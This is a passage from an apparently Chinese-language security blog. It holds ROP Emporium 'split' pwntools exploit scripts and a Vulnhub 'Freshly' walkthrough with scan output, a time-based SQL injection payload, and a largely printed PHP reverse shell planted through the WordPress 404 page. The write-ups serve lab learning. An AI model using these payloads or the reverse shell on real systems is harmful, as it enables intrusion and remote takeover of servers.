class="string">'./split32'</span>)</span><br><span class="line"></span><br><span class="line">ss = <span class="number">0x0804a030</span></span><br><span class="line">func = <span class="number">0x08048657</span></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">44</span> + p32(func)+p32(ss)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.text:08048649 usefulFunction  proc near</span><br><span class="line">.text:08048649 ; __unwind &#123;</span><br><span class="line">.text:08048649                 push    ebp</span><br><span class="line">.text:0804864A                 mov     ebp, esp</span><br><span class="line">.text:0804864C                 sub     esp, 8</span><br><span class="line">.text:0804864F                 sub     esp, 0Ch</span><br><span class="line">.text:08048652                 push    offset command  ; &quot;/bin/ls&quot;</span><br><span class="line">.text:08048657                 call    _system</span><br><span class="line">.text:0804865C                 add     esp, 10h</span><br><span class="line">.text:0804865F                 nop</span><br><span class="line">.text:08048660                 leave</span><br><span class="line">.text:08048661                 retn</span><br><span class="line">.text:08048661 ; &#125; // starts at 8048649</span><br><span class="line">.text:08048661 usefulFunction  endp</span><br></pre></td></tr></table></figure><p>这里使用的方法是直接调用<code>usefulFunction</code>中的system函数，调用之前栈顶是<code>/bin/cat flag</code></p><p>另一种办法是调用<code>.plt</code>的system函数，payload如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./split32'</span>)</span><br><span class="line"></span><br><span class="line">catflag = <span class="number">0x0804a030</span></span><br><span class="line">system = <span class="number">0x08048430</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x28</span>+<span class="number">0x04</span>) +p32(system)+<span class="string">'aaaa'</span>+p32(catflag)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>这里的<code>aaaa</code>就是system函数的返回地址。</p><h3 id="split"><a href="#split" class="headerlink" title="split"></a>split</h3><p>关键位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0000000000400807</span> usefulFunction  proc near</span><br><span class="line">.text:<span class="number">0000000000400807</span> ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400807</span>                 push    rbp</span><br><span class="line">.text:<span class="number">0000000000400808</span>                 mov     rbp, rsp</span><br><span class="line">.text:<span class="number">000000000040080B</span>                 mov     edi, offset command ; <span class="string">"/bin/ls"</span></span><br><span class="line">.text:<span class="number">0000000000400810</span>                 call    _system</span><br><span class="line">.text:<span class="number">0000000000400815</span>                 nop</span><br><span class="line">.text:<span class="number">0000000000400816</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">0000000000400817</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400817</span> ; &#125; <span class="comment">// starts at 400807</span></span><br><span class="line">.text:<span class="number">0000000000400817</span> usefulFunction  endp</span><br></pre></td></tr></table></figure><p>这里64位程序不是栈上传参，而是利用<code>rdi</code>来传递第一个参数，那么需要<code>pop rdi;ret</code>这个gadget.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwn@ubuntu:~/rop_emporium_all_challenges/split$ pipenv run ropper --file split --search <span class="string">"pop|rdi"</span></span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: PHDR</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[INFO] Load gadgets <span class="keyword">for</span> section: LOAD</span><br><span class="line">[LOAD] loading... <span class="number">100</span>%</span><br><span class="line">[LOAD] removing <span class="keyword">double</span> gadgets... <span class="number">100</span>%</span><br><span class="line">[INFO] Searching <span class="keyword">for</span> gadgets: pop|rdi</span><br><span class="line"></span><br><span class="line">[INFO] File: split</span><br><span class="line"><span class="number">0x000000000040087c</span>: pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x000000000040087e</span>: pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x0000000000400880</span>: pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x0000000000400882</span>: pop r15; ret; </span><br><span class="line"><span class="number">0x000000000040069f</span>: pop rbp; mov edi, <span class="number">0x601080</span>; jmp rax; </span><br><span class="line"><span class="number">0x000000000040087b</span>: pop rbp; pop r12; pop r13; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x000000000040087f</span>: pop rbp; pop r14; pop r15; ret; </span><br><span class="line"><span class="number">0x00000000004006b0</span>: pop rbp; ret; </span><br><span class="line"><span class="number">0x0000000000400883</span>: pop rdi; ret; </span><br><span class="line"><span class="number">0x0000000000400881</span>: pop rsi; pop r15; ret; </span><br><span class="line"><span class="number">0x000000000040087d</span>: pop rsp; pop r13; pop r14; pop r15; ret;</span><br></pre></td></tr></table></figure><p>类似，两种利用方式payload.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x0000000000400883</span></span><br><span class="line">system = <span class="number">0x0000000000400810</span></span><br><span class="line">cat = <span class="number">0x00601060</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span>*<span class="number">40</span> + p64(pop_rdi) + p64(cat) + p64(system)</span><br><span class="line"></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./split'</span>)</span><br><span class="line"></span><br><span class="line">catflag = <span class="number">0x601060</span></span><br><span class="line">system = <span class="number">0x4005e0</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x400883</span></span><br><span class="line">payload = <span class="string">'a'</span>*(<span class="number">0x20</span> + <span class="number">0x08</span>) + p64(pop_rdi_ret) +p64(catflag)+p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>TopHatSec:Freshly- Vulnhub</title>
      <link href="/2018/10/26/Freshly-Vulnhub/"/>
      <url>/2018/10/26/Freshly-Vulnhub/</url>
      
        <content type="html"><![CDATA[<h1 id="TopHatSec-Freshly-Vulnhub"><a href="#TopHatSec-Freshly-Vulnhub" class="headerlink" title="TopHatSec: Freshly- Vulnhub"></a>TopHatSec: Freshly- Vulnhub</h1><p>参考:<br><code>http://www.freebuf.com/column/162631.html</code><br><code>https://www.ins1gn1a.com/vulnhub-freshly-vm/</code></p><h4 id="靶机下载地址"><a href="#靶机下载地址" class="headerlink" title="靶机下载地址"></a>靶机下载地址</h4><p><code>https://www.vulnhub.com/entry/tophatsec-freshly,118/</code></p><h4 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h4><ul><li>端口扫描</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS 192.168.50.78</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-25 08:37 EDT</span><br><span class="line">Nmap scan report for Freshly (192.168.50.78)</span><br><span class="line">Host is up (0.88s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE    SERVICE</span><br><span class="line">80/tcp   open     http</span><br><span class="line">443/tcp  open     https</span><br><span class="line">514/tcp  filtered shell</span><br><span class="line">8080/tcp open     http-proxy</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">nmap -A 192.168.50.78</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2018-10-25 08:38 EDT</span><br><span class="line">Nmap scan report for Freshly (192.168.50.78)</span><br><span class="line">Host is up (0.016s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.7 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.7 (Ubuntu)</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">443/tcp  open     ssl/http Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">| ssl-cert: Subject: commonName=www.example.com</span><br><span class="line">| Not valid before: 2015-02-17T03:30:05</span><br><span class="line">|_Not valid after:  2025-02-14T03:30:05</span><br><span class="line">514/tcp  filtered shell</span><br><span class="line">8080/tcp open     http     Apache httpd</span><br><span class="line">|_http-server-header: Apache</span><br><span class="line">|_http-title: Site doesn&apos;t have a title (text/html).</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 80/tcp)</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.12 ms 10.10.10.2</span><br><span class="line">2   0.13 ms Freshly (192.168.50.78)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 33.19 seconds</span><br></pre></td></tr></table></figure><ul><li>nikto</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nikto -host http://192.168.50.78</span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.50.78</span><br><span class="line">+ Target Hostname:    192.168.50.78</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2018-10-25 08:43:38 (GMT-4)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.4.7 (Ubuntu)</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, fields: 0x2f 0x50f4228b8016c </span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ No CGI Directories found (use &apos;-C all&apos; to force check all possible dirs)</span><br><span class="line">+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS </span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.5</span><br><span class="line">+ Uncommon header &apos;x-ob_mode&apos; found, with contents: 0</span><br><span class="line">+ OSVDB-3233: /icons/README: Apache default file found.</span><br><span class="line">+ /login.php: Admin login page/section found.</span><br><span class="line">+ /phpmyadmin/: phpMyAdmin directory found</span><br><span class="line">+ 7686 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:           2018-10-25 08:43:50 (GMT-4) (12 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure><ul><li>使用wpscan</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://192.168.50.78:8080/wordpress</span><br></pre></td></tr></table></figure><ul><li>sqlmap<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.50.78/login.php&quot; --form</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[.]_____ ___ ___  &#123;1.2.10.27#dev&#125;</span><br><span class="line">|_ -| . [(]     | .&apos;| . |</span><br><span class="line">|___|_  [&apos;]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 09:38:28</span><br><span class="line"></span><br><span class="line">[09:38:28] [INFO] testing connection to the target URL</span><br><span class="line">[09:38:28] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">[09:38:28] [INFO] searching for forms</span><br><span class="line">[#1] form:</span><br><span class="line">POST http://192.168.50.78:80/login.php</span><br><span class="line">POST data: user=&amp;password=&amp;s=Submit</span><br><span class="line">do you want to test this form? [Y/n/q] </span><br><span class="line">&gt; </span><br><span class="line">Edit POST data [default: user=&amp;password=&amp;s=Submit] (Warning: blank fields detected): </span><br><span class="line">do you want to fill blank fields with random values? [Y/n] </span><br><span class="line">[09:38:34] [INFO] resuming back-end DBMS &apos;mysql&apos; </span><br><span class="line">[09:38:34] [INFO] using &apos;/root/.sqlmap/output/results-10252018_0938am.csv&apos; as the CSV results file in multiple targets mode</span><br><span class="line">[09:38:34] [INFO] heuristics detected web page charset &apos;ascii&apos;</span><br><span class="line">sqlmap resumed the following injection point(s) from stored session:</span><br><span class="line">---</span><br><span class="line">Parameter: user (POST)</span><br><span class="line">    Type: AND/OR time-based blind</span><br><span class="line">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><br><span class="line">    Payload: user=DIaW&apos; AND (SELECT * FROM (SELECT(SLEEP(5)))iUZw)-- lBgc&amp;password=&amp;s=Submit</span><br><span class="line">---</span><br><span class="line">do you want to exploit this SQL injection? [Y/n] </span><br><span class="line">[09:38:34] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Apache 2.4.7, PHP 5.5.9</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0.12</span><br><span class="line">[09:38:34] [INFO] you can find results of scanning in multiple targets mode inside the CSV file &apos;/root/.sqlmap/output/results-10252018_0938am.csv&apos;</span><br><span class="line"></span><br><span class="line">[*] shutting down at 09:38:34</span><br></pre></td></tr></table></figure></li></ul><p>这里还试着用了一个目录爆破工具</p><p><code>https://github.com/Strikersb/webdirscan</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>sqlmap找到用户名密码后,登录普通的登录界面并没有什么用,这里要找到wordpress的后台登录页面进行登录.</p><p>这里貌似就是经验问题,我一直找不到/wp-admin,这个页面,以后应该可以尝试暴力以下.</p><p>有时间可以看一下别人的扫描脚本怎么写的</p><p>登录到wordpress之后就是要上传php反弹shell了.</p><p>这里把404页面修改了,反弹shell用的是<code>http://pentestmonkey.net/tools/web-shells/php-reverse-shell</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// php-reverse-shell - A Reverse Shell implementation in PHP</span><br><span class="line">// Copyright (C) 2007 pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  The author accepts no liability</span><br><span class="line">// for damage caused by this tool.  If these terms are not acceptable to you, then</span><br><span class="line">// do not use this tool.</span><br><span class="line">//</span><br><span class="line">// In all other respects the GPL version 2 applies:</span><br><span class="line">//</span><br><span class="line">// This program is free software; you can redistribute it and/or modify</span><br><span class="line">// it under the terms of the GNU General Public License version 2 as</span><br><span class="line">// published by the Free Software Foundation.</span><br><span class="line">//</span><br><span class="line">// This program is distributed in the hope that it will be useful,</span><br><span class="line">// but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="line">// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="line">// GNU General Public License for more details.</span><br><span class="line">//</span><br><span class="line">// You should have received a copy of the GNU General Public License along</span><br><span class="line">// with this program; if not, write to the Free Software Foundation, Inc.,</span><br><span class="line">// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.</span><br><span class="line">//</span><br><span class="line">// This tool may be used for legal purposes only.  Users take full responsibility</span><br><span class="line">// for any actions performed using this tool.  If these terms are not acceptable to</span><br><span class="line">// you, then do not use this tool.</span><br><span class="line">//</span><br><span class="line">// You are encouraged to send comments, improvements or suggestions to</span><br><span class="line">// me at pentestmonkey@pentestmonkey.net</span><br><span class="line">//</span><br><span class="line">// Description</span><br><span class="line">// -----------</span><br><span class="line">// This script will make an outbound TCP connection to a hardcoded IP and port.</span><br><span class="line">// The recipient will be given a shell running as the current user (apache normally).</span><br><span class="line">//</span><br><span class="line">// Limitations</span><br><span class="line">// -----------</span><br><span class="line">// proc_open and stream_set_blocking require PHP version 4.3+, or 5+</span><br><span class="line">// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.</span><br><span class="line">// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.</span><br><span class="line">//</span><br><span class="line">// Usage</span><br><span class="line">// -----</span><br><span class="line">// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.</span><br><span class="line"></span><br><span class="line">set_time_limit (0);</span><br><span class="line">$VERSION = &quot;1.0&quot;;</span><br><span class="line">$ip = &apos;127.0.0.1&apos;;  // CHANGE THIS</span><br><span class="line">$port = 1234;       // CHANGE THIS</span><br><span class="line">$chunk_size = 1400;</span><br><span class="line">$write_a = null;</span><br><span class="line">$error_a = null;</span><br><span class="line">$shell = &apos;uname -a; w; id; /bin/sh -i&apos;;</span><br><span class="line">$daemon = 0;</span><br><span class="line">$debug = 0;</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Daemonise ourself if possible to avoid zombies later</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// pcntl_fork is hardly ever available, but will allow us to daemonise</span><br><span class="line">// our php process and avoid zombies.  Worth a try...</span><br><span class="line">if (function_exists(&apos;pcntl_fork&apos;)) &#123;</span><br><span class="line">// Fork and have the parent process exit</span><br><span class="line">$pid = pcntl_fork();</span><br><span class="line"></span><br><span class="line">if ($pid == -1) &#123;</span><br><span class="line">printit(&quot;ERROR: Can&apos;t fork&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($pid) &#123;</span><br><span class="line">exit(0);  // Parent exits</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Make the current process a session leader</span><br><span class="line">// Will only succeed if we forked</span><br><span class="line">if (posix_setsid() == -1) &#123;</span><br><span class="line">printit(&quot;Error: Can&apos;t setsid()&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$daemon = 1;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">printit(&quot;WARNING: Failed to daemonise.  This is quite common and not fatal.&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Change to a safe directory</span><br><span class="line">chdir(&quot;/&quot;);</span><br><span class="line"></span><br><span class="line">// Remove any umask we inherited</span><br><span class="line">umask(0);</span><br><span class="line"></span><br><span class="line">//</span><br><span class="line">// Do the reverse shell...</span><br><span class="line">//</span><br><span class="line"></span><br><span class="line">// Open reverse connection</span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) &#123;</span><br><span class="line">printit(&quot;$errstr ($errno)&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Spawn shell process</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  // stdin is a pipe that the child will read from</span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  // stdout is a pipe that the child will write to</span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)   // stderr is a pipe that the child will write to</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$process = proc_open($shell, $descriptorspec, $pipes);</span><br><span class="line"></span><br><span class="line">if (!is_resource($process)) &#123;</span><br><span class="line">printit(&quot;ERROR: Can&apos;t spawn shell&quot;);</span><br><span class="line">exit(1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Set everything to non-blocking</span><br><span class="line">// Reason: Occsionally reads will block, even though stream_select tells us they won&apos;t</span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 